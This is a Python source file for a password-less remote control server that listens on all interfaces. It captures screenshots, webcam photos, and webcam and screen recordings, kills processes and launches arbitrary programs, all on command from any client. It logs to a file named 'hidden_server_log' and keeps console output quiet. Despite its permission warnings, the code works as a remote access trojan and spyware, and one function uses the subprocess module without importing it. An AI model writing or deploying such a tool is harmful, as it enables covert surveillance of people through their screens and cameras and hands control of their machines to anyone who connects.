# server.py
# Remote helper server (no password). RUN ONLY on machines YOU OWN or where you have EXPLICIT permission.
# Listens on 0.0.0.0:12345. Prints local IP for easy copy/paste into client.
# Requirements: pip install pyautogui psutil
# Optional: pip install opencv-python  (for webcam and video writer)

import os
import sys
import time
import socket
import json
import io
import threading
import logging
import struct
import zipfile
from pathlib import Path
from datetime import datetime

# Logging
DL = Path.home() / "Downloads"
DL.mkdir(exist_ok=True)
log_file = DL / f"hidden_server_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
console_handler = logging.StreamHandler(sys.stderr)
console_handler.setLevel(logging.CRITICAL)
logging.getLogger().addHandler(console_handler)

# Core imports
try:
    import pyautogui
    import psutil
    logging.info("Core libraries loaded.")
except Exception as e:
    logging.error(f"Missing core libraries: {e}")
    print(f"Missing core libraries: {e}. Install: pip install pyautogui psutil", file=sys.stderr)
    sys.exit(1)

# Optional: cv2
cv2_available = False
try:
    import cv2
    cv2_available = True
    logging.info("OpenCV loaded.")
except Exception:
    logging.warning("OpenCV not installed. Webcam/video features degrade to zip-of-frames where needed.")

TS = lambda: datetime.now().strftime("%Y%m%d_%H%M%S")

# Recording state for webcam and screen
webcam_state = {"active": False, "cap": None, "writer": None, "file": None}
screen_state = {"active": False, "frames": [], "writer": None, "file": None, "tmp_dir": None}

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def take_screenshot():
    try:
        img = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        file_data = img_bytes.getvalue()
        filename = f"screenshot_{TS()}.png"
        logging.info(f"Screenshot taken: {filename}")
        return {"status": "ok", "messages": ["Screenshot taken."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")
        return {"status": "error", "messages": [f"Screenshot failed: {e}"]}

def typed_capture_remote(text):
    try:
        text = text.strip()
        if not text:
            return {"status": "ok", "messages": ["No text provided."]}
        out_text = f"Remote typed input: {text}\nTimestamp: {TS()}"
        filename = f"typed_input_{TS()}.txt"
        file_data = out_text.encode('utf-8')
        logging.info("Typed capture created.")
        return {"status": "ok", "messages": ["Typed input processed."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Typed capture failed: {e}")
        return {"status": "error", "messages": [f"Typed capture failed: {e}"]}

def list_processes(limit=300):
    try:
        processes = []
        cnt = 0
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = p.info
                processes.append(f"{info['pid']:6}  {str(info.get('username',''))[:15]:15}  {info.get('name','')}")
                cnt += 1
                if cnt >= limit:
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        processes.append(f"... shown {min(cnt, limit)} processes (total may be higher)")
        logging.info(f"Listed {cnt} processes")
        return {"status": "ok", "messages": processes}
    except Exception as e:
        logging.error(f"List processes failed: {e}")
        return {"status": "error", "messages": [f"List processes failed: {e}"]}

def close_specific_process_remote(name):
    try:
        name = name.strip()
        if not name:
            return {"status": "ok", "messages": ["No name provided."]}
        found = False
        for p in psutil.process_iter(['pid','name']):
            try:
                info = p.info
                if info.get('name','').lower() == name.lower():
                    try:
                        p.terminate()
                        p.wait(timeout=3)
                        found = True
                    except Exception:
                        try:
                            p.kill()
                            found = True
                        except Exception:
                            pass
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        msg = "Process terminated." if found else "No matching processes found."
        return {"status": "ok", "messages": [msg]}
    except Exception as e:
        logging.error(f"Close process failed: {e}")
        return {"status": "error", "messages": [f"Close process failed: {e}"]}

def generate_harmless_files():
    try:
        harmless_data = []
        for i in range(1,4):
            content = f"harmless generated file {i}.\nTimestamp: {TS()}\n"
            harmless_data.append({"name": f"harmless_generated_{i}_{TS()}.txt", "data": content.encode('utf-8')})
        zip_bytes = io.BytesIO()
        with zipfile.ZipFile(zip_bytes, 'w') as zf:
            for item in harmless_data:
                zf.writestr(item["name"], item["data"])
        file_data = zip_bytes.getvalue()
        filename = f"harmless_files_{TS()}.zip"
        logging.info(f"Generated harmless zip: {filename}")
        return {"status": "ok", "messages": ["Harmless files generated."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Generate files failed: {e}")
        return {"status": "error", "messages": [f"Generate files failed: {e}"]}

def open_program_remote(cmd):
    try:
        cmd = cmd.strip()
        if not cmd:
            return {"status": "ok", "messages": ["No command provided."]}
        if os.name == 'nt':
            os.startfile(cmd)
        else:
            import shlex
            subprocess.Popen(shlex.split(cmd))
        logging.info(f"Launched: {cmd}")
        return {"status": "ok", "messages": ["Program launched."]}
    except Exception as e:
        logging.error(f"Open program failed: {e}")
        return {"status": "error", "messages": [f"Open program failed: {e}"]}

def take_webcam_photo():
    if not cv2_available:
        return {"status": "error", "messages": ["Webcam not available (install opencv-python)."]}
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return {"status": "error", "messages": ["Could not open webcam."]}
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            file_data = buf.tobytes()
            filename = f"webcam_{TS()}.jpg"
            logging.info(f"Webcam photo: {filename}")
            return {"status": "ok", "messages": ["Webcam photo taken."], "file_data": file_data, "filename": filename}
        else:
            return {"status": "error", "messages": ["Failed to capture webcam frame."]}
    except Exception as e:
        logging.error(f"Webcam photo failed: {e}")
        return {"status": "error", "messages": [f"Webcam photo failed: {e}"]}

def toggle_webcam_recording():
    if not cv2_available:
        return {"status": "error", "messages": ["Webcam recording requires opencv-python."]}
    try:
        was_active = webcam_state["active"]
        if not was_active:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                cap.release()
                return {"status": "error", "messages": ["Could not open webcam for recording."]}
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) or 640)
            h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) or 480)
            fname = f"webcam_rec_{TS()}.avi"
            full_path = DL / fname
            writer = cv2.VideoWriter(str(full_path), fourcc, 20.0, (w, h))
            webcam_state.update(active=True, cap=cap, writer=writer, file=str(full_path))
            logging.info("Webcam recording started.")
            return {"status": "ok", "messages": ["Webcam recording started."]}
        else:
            webcam_state["active"] = False
            if webcam_state["cap"]:
                webcam_state["cap"].release()
            if webcam_state["writer"]:
                webcam_state["writer"].release()
            file_path = webcam_state.get("file")
            webcam_state.update(cap=None, writer=None, file=None)
            logging.info("Webcam recording stopped.")
            if file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                os.remove(file_path)
                filename = os.path.basename(file_path)
                return {"status": "ok", "messages": ["Webcam recording stopped."], "file_data": file_data, "filename": filename}
            return {"status": "ok", "messages": ["Webcam recording stopped (no file)."]}
    except Exception as e:
        logging.error(f"Toggle webcam failed: {e}")
        return {"status": "error", "messages": [f"Toggle webcam failed: {e}"]}

def screen_record_frame_poll():
    if not screen_state["active"]:
        return
    try:
        img = pyautogui.screenshot()
        if cv2_available and screen_state.get("writer"):
            # convert to BGR numpy
            import numpy as np
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            screen_state["writer"].write(frame)
        else:
            # store PNG bytes
            b = io.BytesIO()
            img.save(b, format='PNG')
            screen_state["frames"].append(b.getvalue())
    except Exception as e:
        logging.error(f"Screen record poll error: {e}")
        # if errors occur, stop recording to avoid endless exception
        screen_state["active"] = False

def start_screen_recording():
    if screen_state["active"]:
        return {"status": "ok", "messages": ["Screen recording already active."]}
    try:
        if cv2_available:
            # use VideoWriter
            import numpy as np
            img = pyautogui.screenshot()
            h, w = img.size[1], img.size[0]
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            fname = f"screen_rec_{TS()}.avi"
            full_path = DL / fname
            writer = cv2.VideoWriter(str(full_path), fourcc, 10.0, (w, h))
            screen_state.update(active=True, writer=writer, file=str(full_path), frames=[])
            logging.info("Screen recording started (video writer).")
            return {"status": "ok", "messages": ["Screen recording started (video)."]}
        else:
            # fallback: collect PNG frames and zip later
            screen_state.update(active=True, writer=None, file=None, frames=[], tmp_dir=None)
            logging.info("Screen recording started (frame collection).")
            return {"status": "ok", "messages": ["Screen recording started (frames)."]}
    except Exception as e:
        logging.error(f"Start screen recording failed: {e}")
        return {"status": "error", "messages": [f"Start screen recording failed: {e}"]}

def stop_screen_recording_and_package():
    if not screen_state["active"]:
        return {"status": "ok", "messages": ["Screen recording not active."]}
    screen_state["active"] = False
    try:
        if cv2_available and screen_state.get("writer"):
            writer = screen_state.get("writer")
            if writer:
                writer.release()
            file_path = screen_state.get("file")
            screen_state.update(writer=None, file=None, frames=[])
            if file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    data = f.read()
                os.remove(file_path)
                filename = os.path.basename(file_path)
                logging.info(f"Screen recording packaged: {filename}")
                return {"status": "ok", "messages": ["Screen recording stopped."], "file_data": data, "filename": filename}
            return {"status": "ok", "messages": ["Screen recording stopped (no file)."]}
        else:
            # zip frames
            frames = screen_state.get("frames", [])
            if not frames:
                screen_state.update(frames=[])
                return {"status": "ok", "messages": ["Screen recording stopped (no frames)."]}
            zip_bytes = io.BytesIO()
            with zipfile.ZipFile(zip_bytes, 'w') as zf:
                for i, fr in enumerate(frames):
                    zf.writestr(f"frame_{i:04d}.png", fr)
            screen_state.update(frames=[])
            file_data = zip_bytes.getvalue()
            filename = f"screen_frames_{TS()}.zip"
            logging.info(f"Screen recording packaged as zip: {filename}")
            return {"status": "ok", "messages": ["Screen recording stopped and packaged."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Stop screen recording failed: {e}")
        return {"status": "error", "messages": [f"Stop screen recording failed: {e}"]}

def recording_daemon():
    while True:
        try:
            if webcam_state["active"]:
                cap = webcam_state.get("cap")
                writer = webcam_state.get("writer")
                if cap and writer:
                    ok, frame = cap.read()
                    if ok:
                        writer.write(frame)
                    else:
                        # stop webcam recording if frame fails
                        webcam_state["active"] = False
            if screen_state["active"]:
                screen_record_frame_poll()
        except Exception as e:
            logging.error(f"Recording daemon exception: {e}")
        time.sleep(0.05)

def handle_command(req):
    cmd = req.get("command", "").strip()
    logging.info(f"Handle command: {cmd}")
    try:
        if cmd == "take_screenshot":
            return take_screenshot()
        elif cmd == "typed_capture":
            return typed_capture_remote(req.get("text",""))
        elif cmd == "list_processes":
            return list_processes(int(req.get("limit",300)))
        elif cmd == "close_process":
            return close_specific_process_remote(req.get("name",""))
        elif cmd == "generate_harmless_files":
            return generate_harmless_files()
        elif cmd == "open_program":
            return open_program_remote(req.get("cmd",""))
        elif cmd == "take_webcam_photo":
            return take_webcam_photo()
        elif cmd == "toggle_webcam_recording":
            return toggle_webcam_recording()
        elif cmd == "start_screen_recording":
            return start_screen_recording()
        elif cmd == "stop_screen_recording":
            return stop_screen_recording_and_package()
        else:
            return {"status": "error", "messages": [f"Unknown command '{cmd}'"]}
    except Exception as e:
        logging.error(f"Command handling failed ({cmd}): {e}")
        return {"status": "error", "messages": [f"Command failed: {e}"]}

def socket_handler(conn, addr):
    logging.info(f"Client connected: {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            try:
                req = json.loads(data.decode('utf-8'))
            except Exception:
                logging.error("Invalid JSON from client.")
                break
            resp = handle_command(req)
            # send JSON (without file_data)
            json_resp = {k: v for k, v in resp.items() if k != 'file_data'}
            resp_str = json.dumps(json_resp)
            conn.send(resp_str.encode('utf-8'))
            # always send 8-byte file length header
            file_data = resp.get('file_data', b'') or b''
            file_len = len(file_data)
            conn.send(struct.pack('Q', file_len))
            if file_len > 0:
                conn.sendall(file_data)
                logging.info(f"Sent file: {resp.get('filename','unknown')} ({file_len} bytes)")
    except Exception as e:
        logging.error(f"Socket handler error: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass
        logging.info(f"Client disconnected: {addr}")

def start_server():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', 12345))
        server_socket.listen(5)
        logging.info("Server listening on 0.0.0.0:12345")
        return server_socket
    except Exception as e:
        logging.error(f"Server start failed: {e}")
        print(f"Server start failed: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    print("!!! SECURITY NOTICE: Run this ONLY on machines you OWN or with explicit permission. This server has NO AUTH.")
    local_ip = get_local_ip()
    print(f"Server will listen on: {local_ip}:12345")
    print("Press Enter to continue and start server...")
    input()
    server_sock = start_server()
    # daemon threads
    recorder = threading.Thread(target=recording_daemon, daemon=True)
    recorder.start()
    print("Server started. Waiting for connections...")
    try:
        while True:
            conn, addr = server_sock.accept()
            t = threading.Thread(target=socket_handler, args=(conn, addr), daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("Server shutting down.")
    finally:
        server_sock.close()
